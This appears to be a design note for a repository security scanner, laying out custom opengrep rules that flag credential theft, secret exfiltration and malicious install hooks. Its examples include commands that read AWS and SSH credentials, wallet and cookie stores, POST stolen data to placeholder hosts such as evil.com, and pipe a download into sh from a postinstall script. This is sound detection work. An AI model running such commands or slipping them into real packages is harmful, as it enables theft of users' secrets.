# Creating Custom Opengrep Rules for Credential Theft Detection

## Problem

The scanner currently shows `🚨 0 Info Leak` for the malicious test repository because opengrep's default rules don't have rule IDs that match the patterns in `classifyAsInfoLeak()`.

The scanner looks for rule IDs containing patterns like:
- `steal-ssh`, `reads-aws`, `credential-theft`
- `exfiltrate-env`, `browser-cookie`, `steal-crypto`
- etc.

But opengrep's default rules return IDs like:
- `detected-generic-api-key`
- `detected-github-token`
- `detected-stripe-api-key`

These don't match our info-leak classification patterns.

## Solution

Create custom opengrep/semgrep rules with appropriate rule IDs that will be classified as info-leaks.

## Required Rules

### 1. AWS Credential Theft (`steal-aws-credentials`)

**Detects:** Reading `~/.aws/credentials` or `.aws/config`

**Pattern Examples:**
```javascript
// JavaScript
fs.readFileSync(path.join(os.homedir(), '.aws', 'credentials'))
fs.readFileSync('~/.aws/credentials')

// Python
open(os.path.expanduser('~/.aws/credentials'))

// Shell
cat ~/.aws/credentials
cat $HOME/.aws/credentials
```

**Rule File:** `rules/credential-theft/aws-credentials.yaml`

```yaml
rules:
  - id: steal-aws-credentials
    message: Reading AWS credentials file - potential credential theft
    severity: ERROR
    metadata:
      category: info-leak
      cwe: "CWE-522: Insufficiently Protected Credentials"
    languages: [javascript, typescript, python, bash, sh]
    patterns:
      - pattern-either:
          # JavaScript/TypeScript
          - pattern: fs.readFileSync(..., ".aws/credentials", ...)
          - pattern: fs.readFile(..., ".aws/credentials", ...)
          # Python
          - pattern: open(os.path.expanduser("~/.aws/credentials"))
          # Shell
          - pattern: cat ~/.aws/credentials
          - pattern: cat $HOME/.aws/credentials
```

### 2. SSH Key Theft (`steal-ssh-keys`)

**Detects:** Reading SSH private keys from `~/.ssh/`

**Pattern Examples:**
```javascript
fs.readFileSync(path.join(os.homedir(), '.ssh', 'id_rsa'))
fs.readFileSync('~/.ssh/id_rsa')
fs.readdirSync(path.join(os.homedir(), '.ssh'))
```

**Rule File:** `rules/credential-theft/ssh-keys.yaml`

```yaml
rules:
  - id: steal-ssh-keys
    message: Reading SSH private keys - potential credential theft
    severity: ERROR
    metadata:
      category: info-leak
      cwe: "CWE-522: Insufficiently Protected Credentials"
    languages: [javascript, typescript, python, bash, sh]
    patterns:
      - pattern-either:
          # JavaScript
          - pattern: fs.readFileSync(..., ".ssh/id_rsa", ...)
          - pattern: fs.readFileSync(..., ".ssh", ...)
          # Python
          - pattern: open(os.path.expanduser("~/.ssh/id_rsa"))
          # Shell
          - pattern: cat ~/.ssh/id_rsa
          - pattern: cat $HOME/.ssh/id_rsa*
```

### 3. Environment Variable Exfiltration (`exfiltrate-env-vars`)

**Detects:** Dumping all environment variables

**Pattern Examples:**
```javascript
Object.keys(process.env)
JSON.stringify(process.env)

// Python
dict(os.environ)
os.environ.items()

// Shell
env
printenv
```

**Rule File:** `rules/credential-theft/environment-vars.yaml`

```yaml
rules:
  - id: exfiltrate-env-vars
    message: Dumping environment variables - potential credential exfiltration
    severity: ERROR
    metadata:
      category: info-leak
    languages: [javascript, typescript, python]
    patterns:
      - pattern-either:
          # JavaScript - full env dump
          - pattern: JSON.stringify(process.env)
          - pattern: dict(os.environ)
```

### 4. Cryptocurrency Wallet Theft (`steal-crypto-wallets`)

**Detects:** Accessing Bitcoin/Ethereum/Metamask wallets

**Pattern Examples:**
```javascript
fs.readFileSync(..., '.bitcoin/wallet.dat')
fs.readFileSync(..., '.ethereum/keystore/', ...)
fs.readdirSync(..., 'Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn')
```

**Rule File:** `rules/credential-theft/crypto-wallets.yaml`

```yaml
rules:
  - id: steal-crypto-wallets
    message: Accessing cryptocurrency wallets - potential theft
    severity: ERROR
    metadata:
      category: info-leak
    languages: [javascript, typescript, python, bash, sh]
    patterns:
      - pattern-either:
          # Bitcoin
          - pattern: |
              ...
              ".bitcoin/wallet.dat"
              ...
          # Ethereum
          - pattern: |
              ...
              ".ethereum/keystore"
              ...
          # Metamask (browser extension ID)
          - pattern: |
              ...
              "nkbihfbeogaeaoehlefnkodbefgpgknn"
              ...
```

### 5. Browser Cookie Theft (`steal-browser-cookies`)

**Detects:** Accessing browser cookie databases

**Pattern Examples:**
```javascript
sqlite3.Database('.../Chrome/Default/Cookies')
sqlite3.connect('.../firefox/.../cookies.sqlite')
```

**Rule File:** `rules/credential-theft/browser-cookies.yaml`

```yaml
rules:
  - id: steal-browser-cookies
    message: Accessing browser cookie database - potential credential theft
    severity: ERROR
    metadata:
      category: info-leak
    languages: [javascript, typescript, python]
    patterns:
      - pattern-either:
          - pattern: |
              ...
              "Chrome/Default/Cookies"
              ...
          - pattern: |
              ...
              "firefox/.../cookies.sqlite"
              ...
```

### 6. Suspicious Network Exfiltration (`unauthorized-network-exfil`)

**Detects:** HTTP POST to suspicious domains with credential data

**Pattern Examples:**
```javascript
fetch('https://evil.example.com', { method: 'POST', body: credentials })
axios.post('https://attacker.com', stolenData)

// Python
urllib.request.urlopen('https://evil.com', data=credentials)
requests.post('https://attacker.com', json=stolen)
```

**Rule File:** `rules/credential-theft/network-exfil.yaml`

```yaml
rules:
  - id: unauthorized-network-exfil
    message: Suspicious network exfiltration detected
    severity: ERROR
    metadata:
      category: info-leak
    languages: [javascript, typescript, python]
    patterns:
      - pattern-either:
          # Look for POST with credential-related variable names
          - pattern: |
              $CREDS = ...
              ...
              fetch($URL, { method: 'POST', body: $CREDS })
          - pattern: |
              $STOLEN = ...
              ...
              requests.post($URL, ..., data=$STOLEN)
```

### 7. NPM Postinstall Hook (`malicious-postinstall-hook`)

**Detects:** Suspicious commands in package.json scripts

**Pattern Examples:**
```json
{
  "scripts": {
    "postinstall": "curl http://evil.com | sh",
    "postinstall": "node steal-credentials.js"
  }
}
```

**Rule File:** `rules/credential-theft/npm-hooks.yaml`

```yaml
rules:
  - id: malicious-postinstall-hook
    message: Suspicious postinstall script detected
    severity: ERROR
    metadata:
      category: info-leak
    languages: [json]
    paths:
      include:
        - "package.json"
    patterns:
      - pattern-either:
          - pattern-inside: |
              {
                "scripts": {
                  "postinstall": "...",
                  ...
                }
              }
```

### 8. Python Setup.py Install Hook (`malicious-setup-py-hook`)

**Detects:** Credential access in setup.py

**Pattern Examples:**
```python
class PostInstall(install):
    def run(self):
        os.system('curl http://evil.com')
        open(os.path.expanduser('~/.aws/credentials'))
```

**Rule File:** `rules/credential-theft/python-hooks.yaml`

```yaml
rules:
  - id: malicious-setup-py-hook
    message: Suspicious setup.py install hook detected
    severity: ERROR
    metadata:
      category: info-leak
    languages: [python]
    paths:
      include:
        - "setup.py"
    patterns:
      - pattern-either:
          - pattern: |
              class $CLASS(install):
                  def run(self):
                      ...
                      open(os.path.expanduser("~/.aws/credentials"))
                      ...
```

## Directory Structure

```
/home/aoi/gitvet/
├── rules/
│   └── credential-theft/
│       ├── aws-credentials.yaml
│       ├── ssh-keys.yaml
│       ├── environment-vars.yaml
│       ├── browser-cookies.yaml
│       ├── crypto-wallets.yaml
│       ├── network-exfil.yaml
│       ├── npm-hooks.yaml
│       └── python-hooks.yaml
```

## Configuration

Update scanner to use custom rules:

```go
// In cmd/gitscan-server/main.go
scannerCfg.RulesPath = "/home/aoi/gitvet/rules"
```

Or via command line:
```bash
./git-vet-server --rules /home/aoi/gitvet/rules
```

## Testing

Test against the malicious repo:

```bash
# Should now show info-leak findings
git clone https://git.vet/github.com/baocin/known-malicious-repo
```

Expected output:
```
🚨 8+ Info Leak    ✗ 5 Critical    ⚠ 3 High
```

## Rule ID Naming Convention

To be classified as info-leak, rule IDs must contain one of these patterns:

```
- ssh-key, reads-ssh, steal-ssh, exfiltrate-ssh, steals-ssh
- reads-credentials, steal-credentials, credential-theft
- reads-env, environment-var, steal-env, exfiltrate-env
- aws-credential, reads-aws, steal-aws, exfiltrate-aws
- browser-cookie, browser-credential, steal-cookie
- wallet-theft, crypto-wallet, steal-crypto, steal-wallet
- exfiltrate-data, unauthorized-network, phone-home
- reads-private-key, steal-file, unauthorized-read
```

See `internal/scanner/scanner.go:644-694` for complete list.

## Resources

- [Semgrep Rule Syntax](https://semgrep.dev/docs/writing-rules/rule-syntax/)
- [Opengrep Documentation](https://github.com/opengrep/opengrep)
- [Pattern Examples](https://semgrep.dev/docs/writing-rules/pattern-examples/)
